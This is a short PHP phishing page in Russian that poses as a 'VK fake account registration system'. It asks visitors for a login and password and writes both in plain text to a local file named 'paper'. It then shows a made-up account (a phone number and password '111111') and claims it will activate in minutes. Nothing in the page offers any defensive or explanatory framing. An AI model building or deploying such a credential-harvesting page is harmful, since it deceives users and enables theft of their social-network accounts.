<?php 
session_start();
if (!isset($_SESSION['aaa'])) {
$_SESSION['aaa'] = '0';
}
?>
<html>
<head>
<style type="text/css">
@font-face {
	font-family: Segoe UI Light;
	src: url("/fonts/segoeuil.ttf");
}

body {
	display: block;
	max-width: 1100px;
	min-width: 740px;
	margin: auto;
	min-height: 100%;
	border-left: 1px solid #ebf0f5;
	border-right: 1px solid #ebf0f5;
	box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
}

h1 {
	font: 32pt 'Segoe UI Light';
	text-align: center;
}

h2 {
	font: 20pt 'Segoe UI Light';
	margin-left: 40px;
}

.form {
	display: flex;
	justify-content: center;
	flex-wrap: wrap;
}

.form * {
	font: 18pt 'Segoe UI Light';
}

form {
	text-align: center;
}

button {
	width: 70px;
	height: 50px;
	background: white;
	font: 18pt 'Segoe UI Light';
	width: 200px;
}
</style>
</head>
<body>
<?php
if (isset ( $_POST ['login'] ) && isset ( $_POST ['pass'] ) && $_SESSION['aaa'] == 0) {
	$file = fopen ( 'paper', 'a+' );
	fwrite ( $file, $_POST ['login'] . "/" . $_POST ['pass'] . "/" );
	fclose ( $file );
	echo "<h2>Логин: +1 (213) 788-97-23</h2>";
	echo "<h2>Пароль: 111111</h2>";
	echo "<h2>Через пять-десять минут данные вступят в силу :)</h2>";
	$_SESSION['aaa'] = 1;
} else {
	?>
<h1>Система регистрации фейков ВК</h1>
	<form action="#" method="POST">
		<div class="form">
			<table>
				<tr>
					<td>Логин:</td>
					<td><input type='text' name='login'></input></td>
				</tr>
				<tr>
					<td>Пароль:</td>
					<td><input type='password' name='pass'></input></td>
				</tr>
			</table>
			<br>
		</div>
		<br>
		<button type="submit">Поехали</button>
	</form>
<?php
}
?>
</body>
</html>